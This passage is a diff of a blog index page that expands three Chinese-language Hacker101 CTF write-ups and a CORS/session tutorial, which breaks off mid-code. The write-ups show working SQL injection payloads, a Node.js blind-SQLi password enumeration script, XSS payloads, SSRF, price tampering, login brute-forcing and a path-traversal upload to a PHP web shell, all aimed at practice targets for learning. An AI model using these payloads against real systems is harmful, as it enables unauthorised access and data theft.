@@ -7,7 +7,7 @@
 
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
-<title>技術雜記 Technology Notes</title>
+<title>技術雜記 Technology Notes - Jack Yu</title>
 
 <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
 new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
@@ -19,9 +19,9 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
 
 
     <meta property="og:type" content="website">
-<meta property="og:title" content="技術雜記 Technology Notes">
+<meta property="og:title" content="技術雜記 Technology Notes - Jack Yu">
 <meta property="og:url" content="https://yu-jack.github.io/page/2/index.html">
-<meta property="og:site_name" content="技術雜記 Technology Notes">
+<meta property="og:site_name" content="技術雜記 Technology Notes - Jack Yu">
 <meta property="og:locale" content="zh_TW">
 <meta property="og:image" content="https://yu-jack.github.io/images/og_image.png">
 <meta property="article:author" content="Jack Yu">
@@ -83,7 +83,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
         <!-- <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/logo.svg" alt="技術雜記 Technology Notes" height="28">
+                <img src="/images/logo.svg" alt="技術雜記 Technology Notes - Jack Yu" height="28">
             
             </a>
         </div> -->
@@ -153,17 +153,54 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             
         </h1>
         <div class="content">
-            <p>系列篇第三篇，目前題目寫下來都蠻有趣的  </p>
+            <p>系列篇第三篇，目前題目寫下來都蠻有趣的</p>
+<p>&lt;!-- more --&gt;</p>
+<h1><span id="ticketastic-live-instance">Ticketastic: Live Instance</span></h1>
+<p>根據題目總共有 2 個 Flag</p>
+<h2><span id="0x00">0x00</span></h2>
+<p>一進來發現有兩個同樣名稱的題目，這邊先點上面的 DEMO 進去看看<br>
+<img src="/images/ctf/part3-instance-1-01.png" alt></p>
+<p>大概就是介紹，但最後發現一句特別的話『會有機器人來讀這些 ticket』<br>
+不太明白這意思，先放著一邊繼續看看有什麼功能，裡面提到用 admin/admin 可以先登入<br>
+<img src="/images/ctf/part3-instance-1-02.png" alt></p>
+<p>登入後可以看到有一個 ticket 以及可以新建使用者<br>
+<img src="/images/ctf/part3-instance-1-03.png" alt></p>
+<p>點了 ticket 進去看了一下，提到說，如果處理錯誤的話會在這邊被標記起來<br>
+看起來是使用者提供錯誤的連結的話，當機器人處理不了時會在這邊顯示提醒<br>
+但這邊看起來沒什麼洞可以挖，繼續往下<br>
+<img src="/images/ctf/part3-instance-1-04.png" alt></p>
+<p>嘗試去建立使用者，發現可以建立成功<br>
+<img src="/images/ctf/part3-instance-1-05.png" alt></p>
+<p>另外還發現建立方式是用 GET 去建立<br>
+這就有點微妙了，一般來說，像是使用 LINE 等等通訊軟體<br>
+貼連結上去，都會預設去做 GET，然後把預覽顯示出來<br>
+這邊也有可能走這種方式</p>
+<p>這邊建立一個 ticket 嘗試看能不能用 GET 連結的方式去建立使用者<br>
+但卻發現連結處理錯誤!?<br>
+<img src="/images/ctf/part3-instance-1-06.png" alt>
+<img src="/images/ctf/part3-instance-1-07.png" alt></p>
+<p>試著換另一個連結，依舊錯誤
+<img src="/images/ctf/part3-instance-1-08.png" alt></p>
+<p>想了非常久才想到，這應該是 SSRF 的一種利用<br>
+於是把 payload 改成 localhost 的方式去探測能不能用內網方式新增使用者<br>
+發現不再顯示錯誤連結！<br>
+<img src="/images/ctf/part3-instance-1-10.png" alt>
+<img src="/images/ctf/part3-instance-1-11.png" alt></p>
+<p>建立的使用者也能正確地登入！<br>
+<img src="/images/ctf/part3-instance-1-12.png" alt></p>
+<p>接著就把這個 Payload 帶到另一個題目，發現能夠登入！<br>
+登入後發現第一個 FLAG<br>
+<img src="/images/ctf/part3-instance-1-13.png" alt>
+<img src="/images/ctf/part3-instance-1-14.png" alt></p>
+<h2><span id="0x01">0x01</span></h2>
+<p>接下來發現連結上面有 id<br>
+試著帶入單引號發現噴出 SQL Exception<br>
+<img src="/images/ctf/part3-instance-2-01.png" alt></p>
+<p>丟入 sqlmap dump 出 admin 的密碼就是 FLAG 了
+<img src="/images/ctf/part3-instance-2-02.png" alt></p>
+
         </div>
         
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/09/08/hacker101-part3/#more">繼續閱讀</a>
-                </div>
-            </div>
-        </div>
         
         
     </div>
@@ -207,17 +244,95 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             
         </h1>
         <div class="content">
-            <p>系列篇第二篇，Micro-CMS v1 還因為玩壞掉我重開了快二十次才可以開來玩 QQ  </p>
+            <p>系列篇第二篇，Micro-CMS v1 還因為玩壞掉我重開了快二十次才可以開來玩 QQ</p>
+<p>&lt;!-- more --&gt;</p>
+<h1><span id="micro-cms-v1">Micro-CMS v1</span></h1>
+<p>根據題目總共有 4 個 Flag</p>
+<h2><span id="0x00">0x00</span></h2>
+<p>打開頁面後頁面是
+<img src="/images/ctf/part2-cms-v1-1-01.png" alt></p>
+<p>試著建立 post 試試看
+<img src="/images/ctf/part2-cms-v1-1-02.png" alt></p>
+<p>發現有 XSS 跳出來，但打開原始碼沒發現什麼變化
+<img src="/images/ctf/part2-cms-v1-1-03.png" alt></p>
+<p>按了 Go Home 會去上一頁就跳出 FLAG 了
+<img src="/images/ctf/part2-cms-v1-1-04.png" alt></p>
+<h2><span id="0x01">0x01</span></h2>
+<p>因為跳出 xss 的時候注意到 page 後面的 id 帶的是 8<br>
+覺得很疑惑，因為總共才三筆資料，id 怎麼會是 8?<br>
+<img src="/images/ctf/part2-cms-v1-2-01.png" alt></p>
+<p>於是就 8 7 6 回去一個一個看看是不是有什麼玄機<br>
+發現 id 是 6 的時候，出現了 forbidden 的字樣，寫著不可讀<br>
+<img src="/images/ctf/part2-cms-v1-2-02.png" alt></p>
+<p>竟然不可讀的話，試著加上 edit 發現可以編輯，且內容有 FLAG
+<img src="/images/ctf/part2-cms-v1-2-03.png" alt></p>
+<h2><span id="0x02">0x02</span></h2>
+<p>接下來就試著對每一個頁面的 id 做 SQL Injection<br>
+發現在 edit 的頁面狀況下，id 會有 SQL Injection<br>
+於是就跳出 FLAG 了<br>
+<img src="/images/ctf/part2-cms-v1-3-01.png" alt></p>
+<h2><span id="0x03">0x03</span></h2>
+<p>這個漏洞我找非常非常的久<br>
+才發現原來的 <code>&lt;svg/onload=alert('xss')</code> payload 是跳不出 FLAG 的<br>
+要用 <code>&lt;img src=&quot;&quot; onerror=&quot;javascript:alert('xss')&quot;/&gt;</code> 才跳得出來<br>
+<img src="/images/ctf/part2-cms-v1-4-01.png" alt>
+<img src="/images/ctf/part2-cms-v1-4-02.png" alt></p>
+<p>打開原始碼發現 FLAG 就藏在下面<br>
+第一張是 <code>img</code> tag 的原始碼<br>
+第二張是 <code>svg</code> tag 的原始碼<br>
+兩個都可以觸發 xss，但只有 <code>img</code> 有 FLAG<br>
+不知道為何 <code>svg</code> 那一個 payload 不能觸發<br>
+可能是這題的解答，有希望某一些固定的 tag 去寫<br>
+才會造成 <code>svg</code> payload 跳不出 FLAG<br>
+<img src="/images/ctf/part2-cms-v1-4-03.png" alt>
+<img src="/images/ctf/part2-cms-v1-4-04.png" alt></p>
+<h1><span id="petshop-pro">Petshop Pro</span></h1>
+<p>根據題目總共有 3 個 Flag</p>
+<h2><span id="0x00">0x00</span></h2>
+<p>進去之後頁面長這樣
+<img src="/images/ctf/part2-pet-0-01.png" alt></p>
+<p>按下 Add to Cart 之後
+<img src="/images/ctf/part2-pet-0-02.png" alt></p>
+<p>在按下 checkout
+<img src="/images/ctf/part2-pet-0-03.png" alt></p>
+<p>看來是一個結帳流程，講到錢就想來試試看能不能 0 元結帳<br>
+看了一下 source code 發現有一個 hidden input
+<img src="/images/ctf/part2-pet-0-04.png" alt></p>
+<p>並且用 javascript 把價格更改成 0 元後送出
+<img src="/images/ctf/part2-pet-0-05.png" alt></p>
+<p>送出後價格為 0 元且拿到 FLAG
+<img src="/images/ctf/part2-pet-0-06.png" alt></p>
+<h2><span id="0x01">0x01</span></h2>
+<p>透過 nmap 找到登入點為 <code>/login</code> 之後<br>
+<img src="/images/ctf/part2-pet-1-01.png" alt></p>
+<p>稍微試著輸入單引號看看會不會有 SQL Injection 問題，結果沒有 QQ<br>
+但因為輸入 username 的時候，輸入錯誤會爆出 <strong>Invalid username</strong><br>
+<img src="/images/ctf/part2-pet-1-02.png" alt>
+代表說此系統設計方式，如果輸入正確的 username 的話，應該不會爆出這個錯誤<br>
+根據以上邏輯先寫出第一版程式找找看 username<br>
+<script src="//gist.github.com/e49a273bd60048ffbcd0ddf99c4f5196.js?file=brute_username.js"></script></p>
+<p>找到 username 後輸入，的確變成 <strong>Invalid password</strong><br>
+那就繼續找密碼
+<img src="/images/ctf/part2-pet-1-04.png" alt>
+<img src="/images/ctf/part2-pet-1-03.png" alt></p>
+<p>接下來用一樣的方式找到密碼
+<img src="/images/ctf/part2-pet-1-05.png" alt>
+<script src="//gist.github.com/ec81363f36c5d82438d5388e95266bb7.js?file=brute_password.js"></script></p>
+<p>登入成功，出現 FLAG!
+<img src="/images/ctf/part2-pet-1-06.png" alt></p>
+<h2><span id="0x02">0x02</span></h2>
+<p>登入後發現可以編輯商品
+<img src="/images/ctf/part2-pet-2-01.png" alt>
+<img src="/images/ctf/part2-pet-2-02.png" alt></p>
+<p>試著輸入 xss payload，跳出 xss，但打開原始碼沒發現任何東西
+<img src="/images/ctf/part2-pet-2-03.png" alt></p>
+<p>試著加入購物車發現，也會跳出 xss
+<img src="/images/ctf/part2-pet-2-04.png" alt></p>
+<p>打開原始碼發現 FLAG!
+<img src="/images/ctf/part2-pet-2-05.png" alt></p>
+
         </div>
         
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/09/06/hacker101-part2/#more">繼續閱讀</a>
-                </div>
-            </div>
-        </div>
         
         
     </div>
@@ -261,17 +376,140 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             
         </h1>
         <div class="content">
-            <p>近期想到 HackerOne 找找 Bug Bounty<br>卻意外發現這邊有 CTF 可以玩玩，就順手玩了幾題然後做紀錄</p>
+            <p>近期想到 HackerOne 找找 Bug Bounty<br>
+卻意外發現這邊有 CTF 可以玩玩，就順手玩了幾題然後做紀錄</p>
+<p>&lt;!-- more --&gt;</p>
+<h1><span id="micro-cms-v2">Micro-CMS v2</span></h1>
+<p>根據題目總共有 3 個 Flag</p>
+<h2><span id="0x00">0x00</span></h2>
+<p>一進來頁面長這樣
+<img src="/images/ctf/part1-cms-v2-1-01.png" alt></p>
+<p>試著建立一個新的 Page, 發現要登入帳號密碼
+<img src="/images/ctf/part1-cms-v2-1-02.png" alt></p>
+<p>看到帳號密碼就是要先下個單引號，結果就噴出 exception 了
+<img src="/images/ctf/part1-cms-v2-1-03.png" alt></p>
+<p>根據 error 的 sql<br>
+<code>cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')</code>
+可以推斷出他是透過 username select 出來後再用程式比對密碼<br>
+有 SQL Injectiob 的話，就可以走 union all select 的套路
+username: <code>'union all select 1#</code>
+password: <code>1</code>
+<img src="/images/ctf/part1-cms-v2-1-04.png" alt></p>
+<blockquote>
+<p>補充:<br>
+<code>union all select</code> 可以組合前一個和後一個 SQL 結果
+假設 <code>select username from admins where uername = 'admin'</code> 會回傳 <code>admin</code>
+但如果是 <code>select username from admins where uername = 'not_exists'</code> 會回傳空的東西
+配合 <code>union all select</code> 的話
+<code>select username from admins where uername = 'admin' union all select 1</code> 會回傳 <code>admin</code>, <code>1</code> 兩個值<br>
+那如果是 <code>select username from admins where uername = 'not_exists' union all select 1</code> 只會回傳 <code>1</code></p>
+</blockquote>
+<p>登入成功後，可以看到有一個 Private Page
+<img src="/images/ctf/part1-cms-v2-1-05.png" alt></p>
+<p>點進去後發現第一個 FLAG
+<img src="/images/ctf/part1-cms-v2-1-06.png" alt></p>
+<h2><span id="0x01">0x01</span></h2>
+<p>接下來嘗試新建立 Page
+<img src="/images/ctf/part1-cms-v2-2-01.png" alt></p>
+<p>接下來就試著輸入 <code>&lt;svg/onload=alert(document.cookie)</code>，建立成功
+<img src="/images/ctf/part1-cms-v2-2-02.png" alt></p>
+<p>發現好像也沒跳出什麼東西，嘗試去玩玩修改功能
+發現到第二次修改成功的時候會出現 Not Found URL，覺得有點疑惑
+<img src="/images/ctf/part1-cms-v2-2-03.png" alt></p>
+<p>於是把 Payload 記下來拿到 Post Man 重新送送看，結果就拿到 FLAG 了
+<img src="/images/ctf/part1-cms-v2-2-04.png" alt></p>
+<h2><span id="0x02">0x02</span></h2>
+<p>這個漏洞找有點久，因為登入的時候，過幾秒會被導入到首頁，不會被停留在登入成功的頁面<br>
+為了不讓 js 執行，所以改用 Post Man 去送，想看一下回來的 html 是什麼<br>
+發現回來的 html 註解裡面有一個小提示
+<img src="/images/ctf/part1-cms-v2-3-01.png" alt></p>
+<p>看起來是要往拿到真正的帳號密碼才會拿到 FLAG
+於是把資料丟到 sqlmap 就把資料 dump 出來的
+<img src="/images/ctf/part1-cms-v2-3-02.png" alt></p>
+<p>登入成功後就拿到 FLAG 了</p>
+<p>這邊用另一個不用 sqlmap 而是改用自己寫程式去做 (雖然 sqlmap 原理應該跟這個差不多)<br>
+主要會用到 <code>length(password)</code> 和 <code>length(username)</code> 的方式先去判斷有幾個字元<br>
+再透過 mysql <code>_</code> 的匹配符號去做猜測，這個符號會去做一個比對<br>
+假設字串是 username = abcde，username like 'a____' 就會比對成功，會回傳 true<br>
+但如果是 username like 'b____' 就會比對失敗，會回傳 false<br>
+接下來會利用這個特性去撰寫一個程式去找到完整的帳號密碼</p>
+<p>假如說 <code>length(password) = 5</code><br>
+在 mysql 裡面可以這樣去寫 <code>select username from admins where username = '' or password like '_____'</code><br>
+然後在慢慢替換第一字 <code>select username from admins where username = '' or password like 'a____'</code> 去找到回傳 true 的狀況</p>
+<p>先嘗試去找到密碼的長度，一般輸入結果如果為 false 會回傳 <code>Uknown User</code>
+<img src="/images/ctf/part1-cms-v2-3-03.png" alt></p>
+<p>試著把 payload 改成 <code>' or 1=1#</code> 發現回傳<em>Invalid Password</em>，代表說有找到使用者<br>
+因為 false || true 的結果為 true，所以有成功從資料庫撈到資料<br>
+<img src="/images/ctf/part1-cms-v2-3-04.png" alt></p>
+<p>那是試著改成 <code>' or 1=221#</code> 發現回傳 <em>Uknown User</em>
+<img src="/images/ctf/part1-cms-v2-3-05.png" alt></p>
+<p>所以只要讓 username 那一段 sql 回傳 true，他就會把真正的密碼帶上來<br>
+所以接下來可以試著用 <code>' or length(password)=1#</code> 慢慢去比對看長度<br>
+最後發現密碼長度為 8</p>
+<p>接下來要構造出 like 的 payload 為 <code>' or password like binary '________'#</code><br>
+如果上面成立的話，會回傳 <em>Invalid Password</em> 失敗的話則會回傳 <em>Uknown User</em><br>
+根據這兩個結果可以撰寫程式了，這邊會用 node.js 去做列舉<br>
+這邊加上 binary 去強制去使用 CASE SENSITIVE 去做判別<br>
+密碼為: marcelle<br>
+<img src="/images/ctf/part1-cms-v2-3-06.png" alt></p>
+<p>所以最後 username: <code>' or 1=1#</code> password: <code>marcelle</code><br>
+登入後拿到 FLAG!<br>
+<img src="/images/ctf/part1-cms-v2-3-07.png" alt></p>
+<p>這邊附上程式
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">'axios'</span>);</span><br><span class="line"><span class="keyword">const</span> qs = <span class="built_in">require</span>(<span class="string">'querystring'</span>);</span><br><span class="line">(<span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> passwordLength = <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">let</span> password = <span class="function">(<span class="params">(</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> counter = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">let</span> temp = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span> (counter &lt; passwordLength) &#123;</span><br><span class="line">            temp += <span class="string">'_'</span>;</span><br><span class="line">            counter++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> temp</span><br><span class="line">    &#125;)();</span><br><span class="line">    <span class="keyword">let</span> found = <span class="literal">false</span></span><br><span class="line">    <span class="keyword">let</span> answer = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">let</span> position = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">let</span> allPosibile = <span class="string">"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"</span></span><br><span class="line">    <span class="keyword">while</span> (!found) &#123;</span><br><span class="line">        <span class="keyword">let</span> tempPassword = password</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">const</span> char <span class="keyword">of</span> allPosibile) &#123;</span><br><span class="line">            tempPassword = tempPassword.split(<span class="string">""</span>);</span><br><span class="line">            tempPassword[position] = char;</span><br><span class="line">            tempPassword = tempPassword.join(<span class="string">""</span>)</span><br><span class="line">            <span class="keyword">let</span> payload = <span class="string">`' or password like binary '<span class="subst">$&#123;tempPassword&#125;</span>'#`</span></span><br><span class="line">            <span class="keyword">let</span> result = <span class="keyword">await</span> axios(&#123;</span><br><span class="line">                url: <span class="string">'http://34.74.105.127/58b04db906/login'</span>,</span><br><span class="line">                method: <span class="string">'post'</span>,</span><br><span class="line">                headers: &#123;</span><br><span class="line">                    <span class="string">'content-type'</span>: <span class="string">'application/x-www-form-urlencoded'</span></span><br><span class="line">                &#125;,</span><br><span class="line">                data: qs.stringify(&#123;</span><br><span class="line">                    username: payload,</span><br><span class="line">                    password: <span class="string">''</span></span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;).then(<span class="function"><span class="params">response</span> =&gt;</span> response.data)</span><br><span class="line">            <span class="keyword">if</span> (result.includes(<span class="string">'Invalid password'</span>)) &#123;</span><br><span class="line">                <span class="built_in">console</span>.log(<span class="string">`<span class="subst">$&#123;position&#125;</span>: <span class="subst">$&#123;char&#125;</span>`</span>);</span><br><span class="line">                answer += char;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        position++;</span><br><span class="line">        <span class="keyword">if</span> (position &gt;= passwordLength) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">console</span>.log(answer);</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></p>
+<h1><span id="tempimage">TempImage</span></h1>
+<p>根據題目總共有 2 個 Flag</p>
+<h2><span id="0x00">0x00</span></h2>
+<p>剛進來頁面是這樣
+<img src="/images/ctf/part1-temp-1-01.png" alt></p>
+<p>點進去 upload.php 的頁面，發現可以上傳檔案<br>
+<img src="/images/ctf/part1-temp-1-02.png" alt></p>
+<p>順便開原始碼有哪些 input<br>
+<img src="/images/ctf/part1-temp-1-03.png" alt></p>
+<p>發現有 <code>file</code> 以及 <code>filename</code> 可以做更動，這邊先試著上傳一張正常的圖片
+URL: <code>http://34.74.105.127/020fb13cda/files/eb705c0e32ff0f15c9801f5d40fe290f_test-3.png</code>
+看起來是把我上傳的檔名變成檔案名稱了，這邊就試著改 filename (這邊使用 burp suit 去改，順便方便等等可以改內容)
+把 filename 改成 test-3.html 結尾
+<img src="/images/ctf/part1-temp-1-04.png" alt></p>
+<p>發現成功改成 .html 且成功是內容
+URL: <code>http://34.74.105.127/020fb13cda/files/807fb7eecbe831518d078107d8f0fedf_test-3.html</code>
+<img src="/images/ctf/part1-temp-1-05.png" alt></p>
+<p>這邊嘗試加上 ../ 在 filenmame 上面，發現爆出 FLAG 了
+<img src="/images/ctf/part1-temp-1-06.png" alt>
+<img src="/images/ctf/part1-temp-1-07.png" alt></p>
+<h2><span id="0x01">0x01</span></h2>
+<p>從上一個 FLAG 發現有一個 move_upload_file 裡面會帶一個 path
+<img src="/images/ctf/part1-temp-1-07.png" alt></p>
+<p>這邊試著符合這個 path 帶入 <code>/../test-3.html</code> 試試看
+<img src="/images/ctf/part1-temp-2-01.png" alt></p>
+<p>發現 URL 變成 <code>http://34.74.105.127/020fb13cda/files/test-3.html</code>
+往上跳了一層 ... !?<br>
+因為此 server 可以執行 php，於是改成 php 試試看
+順便在檔案內容之中多加一個 <code>&lt;?php phpinfo(); ?&gt;</code>
+<img src="/images/ctf/part1-temp-2-02.png" alt></p>
+<p>發現內容還是顯示圖片格式?
+<img src="/images/ctf/part1-temp-2-03.png" alt></p>
+<p>這邊試著把檔案內容全砍掉只留下 <code>&lt;?php phpinfo(); ?&gt;</code>
+<img src="/images/ctf/part1-temp-2-04.png" alt></p>
+<p>結果被判定成不是 PNG 不能上傳了
+<img src="/images/ctf/part1-temp-2-05.png" alt></p>
+<p>如果不是改檔案副檔名和 Content-Type 會影響格式判斷的話<br>
+有可能是根據 PNG 的前幾個 bytes 去判斷，所以這邊只留下前面的 bytes<br>
+<img src="/images/ctf/part1-temp-2-06.png" alt></p>
+<p>發現無法顯示 QQ，這邊不確定原因，試了非常久
+<img src="/images/ctf/part1-temp-2-07.png" alt></p>
+<p>後來想到在上傳到上一層不知道會怎樣，於是試試看
+<img src="/images/ctf/part1-temp-2-08.png" alt></p>
+<p>發現成功執行 PHP 檔案！！所以代表可能是 files 那一層有鎖不能顯示 php 檔案
+URL: <code>http://34.74.105.127/020fb13cda/test-3.php</code>
+<img src="/images/ctf/part1-temp-2-09.png" alt></p>
+<p>接下來上傳 web shell 去看看有什麼檔案
+<img src="/images/ctf/part1-temp-2-10.png" alt></p>
+<p>逛了一下，發現 index.php 有 FLAG 存在
+<img src="/images/ctf/part1-temp-2-11.png" alt></p>
+
         </div>
         
-        
-        <div class="level is-mobile">
-            <div class="level-start">
-                <div class="level-item">
-                <a class="button is-size-7 is-light" href="/2019/09/04/hacker101-part1/#more">繼續閱讀</a>
-                </div>
-            </div>
-        </div>
         
         
     </div>
@@ -315,18 +553,127 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
             
         </h1>
         <div class="content">
-            <p>這邊主要在介紹當前後端架構上完全分離 (連 domain 都分離) 狀況下<br>要如何達到使用 session 的方法</p>
-<p>知道 CORS 是什麼的人且想直接知道怎麼做可以直接跳到<a href="#重點筆記">重點筆記</a></p>
+            <p>這邊主要在介紹當前後端架構上完全分離 (連 domain 都分離) 狀況下
+要如何達到使用 session 的方法</p>
+<p>知道 CORS 是什麼的人且想直接知道怎麼做可以直接跳到<a href="#%E9%87%8D%E9%BB%9E%E7%AD%86%E8%A8%98">重點筆記</a></p>
+<p>&lt;!-- more --&gt;</p>
+<h2><span id="前言">前言</span></h2>
+<p>以往我們前後端程式是寫在一起時，都是透過後端程式去 render (渲染) 一個頁面<br>
+而在前端頁面做請求的時候，請求都會帶著 cookie 到 server 上去判別是否屬於為同一個人<br>
+但當我們在前後端完全分離的狀況下，該怎麼去達到這件事情呢?</p>
+<h2><span id="cors">CORS</span></h2>
+<p>瀏覽器有一個限制，當這個 request 請求起始的地方跟 endpoint 不一致得時候會造成所謂 CORS 的問題<br>
+舉例來說，假設網站架設在 https://www.example.com 底下，但是你的 API Server 是在 https://www.example1.com 的話<br>
+這樣網站 POST 到 API Server 的請求就會被阻擋 (這時 request 是從 html 頁面發起)</p>
+<p>因為這個限制，API Server 往往要在 Header 上加上以下幾個東西去符合瀏覽器的規範</p>
+<ol>
+<li>Access-Control-Allow-Headers</li>
+<li>Access-Control-Allow-Origin</li>
+<li>Access-Control-Allow-Methods</li>
+</ol>
+<p>透過設置這三個 header 的參數，就可以讓前端合法的使用 API Server 了
+所以按照剛剛的邏輯去加上 Header 會這樣加<br>
+Access-Control-Allow-Headers: *<br>
+Access-Control-Allow-Origin: https://www.example.com<br>
+Access-Control-Allow-Methods: POST</p>
+<p>然而在使用前後端分離的架構下，身份驗證以及授權就相對上就變得比較難一點<br>
+雖然解法上還可以使用 JWT 去解決這個問題，但這篇文章主要會鎖定在用 sessino 的方式去解決</p>
+<p>題外話，有一種方式也可以繞過 CORS，就是以 Proxy Server 的方式去實作
+以下用著名的 Vue cli 為圖解
+<img src="/images/vue-cli-proxy.png" alt></p>
+<h2><span id="xhr-credential">XHR Credential</span></h2>
+<p>當加上以上三個 CORS 的規範後<br>
+會發現在發出 request 的時候，是不會帶入 cookie 去給 server 做驗證<br>
+<img src="https://imgur.com/ATihx4F.png" alt></p>
+<p>這時候就可以透過 xhr 裡面的 credential 去設定<br>
+當把這個欄位設定成 true 的時候，request 就會夾帶 cookie 到 server 去<br>
+<img src="https://i.imgur.com/neAHW1c.png" alt></p>
+<h2><span id="詳細操作說明">詳細操作說明</span></h2>
+<p>提到前後端完全分離的話，那我們就要準備兩個 server
+一台 server 專門是讀取靜態 html 的 server<br>
+一台 server 專門是處理 API 的 server</p>
+<h3><span id="html-server">html server</span></h3>
+<p>透過 Node.js 快速建立一個可以讀取靜態檔案的 server</p>
+<p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line">app.use(express.static(<span class="string">"./public"</span>));</span><br><span class="line">app.listen(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure></p>
+<p>而 <code>public/index.html</code> 的內容為</p>
+<p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Document<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">let</span> ajax = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="actionscript">    ajax.open(<span class="string">'POST'</span>, <span class="string">'http://localhost:7777/test'</span>);</span></span><br><span class="line"><span class="actionscript">    ajax.setRequestHeader(<span class="string">'Content-Type'</span>, <span class="string">'application/json'</span>);</span></span><br><span class="line"><span class="actionscript">    ajax.onload = <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line">        if (ajax.status === 200) &#123;</span><br><span class="line"><span class="actionscript">            alert(<span class="string">'Received '</span> + ajax.responseText);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"><span class="javascript">    ajax.send(<span class="built_in">JSON</span>.stringify(&#123;</span></span><br><span class="line"><span class="actionscript">        data: <span class="string">"hi from html"</span></span></span><br><span class="line">    &#125;));</span><br><span class="line">    <span class="tag">&lt;/<span 